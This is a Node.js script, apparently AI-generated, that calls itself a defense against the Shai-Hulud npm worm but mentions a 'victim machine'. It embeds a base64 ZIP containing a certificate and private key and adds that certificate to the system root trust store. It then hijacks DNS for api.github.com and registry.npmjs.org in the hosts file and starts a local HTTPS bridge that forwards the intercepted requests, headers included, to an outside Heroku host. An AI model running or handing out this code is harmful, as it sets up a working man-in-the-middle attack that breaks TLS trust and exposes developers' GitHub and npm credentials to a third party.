// Prerequisites
// 1. Node.js must be installed on the victim machine.
// 2. The script must be run with Administrator/Root privileges (to update the Trust Store and Hosts file).
// 3. No npm install is required for the local machine (the script uses native Node.js modules).

// This version is self-contained. It contains the ZIP file (provided in your prompt) encoded as a string. It writes the ZIP to disk, extracts it, and runs the defense.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, execSync } = require('child_process');

// --- CONFIGURATION ---
const ZIP_NAME = 'ShaiHuludShield.zip';
const CERT_NAME = 'fake-cert.pem';
const KEY_NAME = 'fake-key.pem';
const BRIDGE_FILE = 'bridge.js';
const IP_REDIRECT = '127.0.0.1';
const DOMAINS_TO_REDIRECT = ['api.github.com', 'registry.npmjs.org']; 

const PLATFORM = os.platform(); 
const IS_WINDOWS = PLATFORM === 'win32';

// --- ASSETS ---

// The Bridge Script Code
const BRIDGE_SOURCE = `
const https = require('https');
const http = require('http');
const fs = require('fs');

// CONFIGURATION
const HEROKU_APP_URL = 'your-app-name.herokuapp.com'; // *** YOU MUST UPDATE THIS LINE ***
const LOCAL_IP = '127.0.0.1';

const options = {
  key: fs.readFileSync('${KEY_NAME}'),
  cert: fs.readFileSync('${CERT_NAME}'),
};

const proxyHandler = (req, res) => {
    console.log(\`[BRIDGE] Intercepting request for: \${req.headers.host}\${req.url}\`);
    const options = {
        hostname: HEROKU_APP_URL,
        port: 80,
        path: req.url,
        method: req.method,
        headers: { ...req.headers, host: HEROKU_APP_URL }
    };
    const proxyReq = http.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });
    proxyReq.on('error', (e) => {
        console.error(\`[ERROR] Bridge failed: \${e.message}\`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true })); 
    });
    req.pipe(proxyReq, { end: true });
};

https.createServer(options, proxyHandler).listen(443, LOCAL_IP, () => {
    console.log('--- BRIDGE ACTIVE ---');
    console.log(\`Redirecting captured traffic to \${HEROKU_APP_URL}\`);
});
`;

// The Base64 Zip (Contains fake-cert.pem and fake-key.pem)
const ZIP_BASE64 = "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";

// --- STEP 1: DECODE & EXTRACT ZIP ---
function prepareCerts() {
    console.log('[1/4] Decoding embedded certificates...');
    
    // Write Base64 to ZIP
    fs.writeFileSync(ZIP_NAME, Buffer.from(ZIP_BASE64, 'base64'));

    console.log('      Extracting Zip...');
    try {
        if (IS_WINDOWS) {
            execSync(`powershell -Command "Expand-Archive -Path ${ZIP_NAME} -DestinationPath . -Force"`);
        } else {
            // Linux/Mac usually have unzip
            execSync(`unzip -o ${ZIP_NAME}`);
        }
        console.log('      Extraction complete.');
    } catch (e) {
        console.error(`      [ERROR] Failed to unzip: ${e.message}`);
        process.exit(1);
    }
}

// --- STEP 2: TRUST THE CERTIFICATE ---
function trustCert() {
    console.log('[2/4] Adding Certificate to System Trust Store...');
    const certPath = path.resolve(CERT_NAME);

    try {
        if (PLATFORM === 'darwin') { // MacOS
            execSync(`sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain "${certPath}"`);
        } else if (PLATFORM === 'linux') { // Linux
            if (fs.existsSync('/usr/local/share/ca-certificates/')) {
                execSync(`sudo cp "${certPath}" /usr/local/share/ca-certificates/shai-hulud.crt`);
                execSync(`sudo update-ca-certificates`);
            } else if (fs.existsSync('/etc/pki/ca-trust/source/anchors/')) {
                execSync(`sudo cp "${certPath}" /etc/pki/ca-trust/source/anchors/shai-hulud.crt`);
                execSync(`sudo update-ca-trust`);
            }
        } else if (IS_WINDOWS) { // Windows
            execSync(`powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Import-Certificate -FilePath ''${certPath}'' -CertStoreLocation Cert:\\LocalMachine\\Root'"` );
        }
        console.log('      Certificate trusted.');
    } catch (e) {
        console.error(`      [ERROR] Failed to trust certificate: ${e.message}`);
        process.exit(1);
    }
}

// --- STEP 3: UPDATE HOSTS FILE ---
function updateHosts() {
    console.log('[3/4] Hijacking DNS in Hosts file...');
    
    let hostsPath = IS_WINDOWS ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
    let entry = `\n# SHAI-HULUD DEFENSE\n`;
    DOMAINS_TO_REDIRECT.forEach(d => {
        entry += `${IP_REDIRECT} ${d}\n`;
    });

    try {
        const currentContent = fs.readFileSync(hostsPath, 'utf8');
        if (!currentContent.includes('SHAI-HULUD DEFENSE')) {
            fs.appendFileSync(hostsPath, entry);
            console.log('      Hosts file updated.');
        } else {
            console.log('      Hosts file already updated.');
        }
    } catch (e) {
        console.error(`      [ERROR] Cannot write to hosts: ${e.message}`);
        process.exit(1);
    }
}

// --- STEP 4: LAUNCH BRIDGE ---
function startBridge() {
    console.log('[4/4] STARTING BRIDGE SERVER...');
    
    fs.writeFileSync(BRIDGE_FILE, BRIDGE_SOURCE);

    const bridge = spawn('node', [BRIDGE_FILE], { stdio: 'inherit' });
    bridge.on('error', (err) => console.error(`Bridge Error: ${err.message}`));
}

// --- RUN ---
(function run() {
    prepareCerts();
    trustCert();
    updateHosts();
    startBridge();
})();
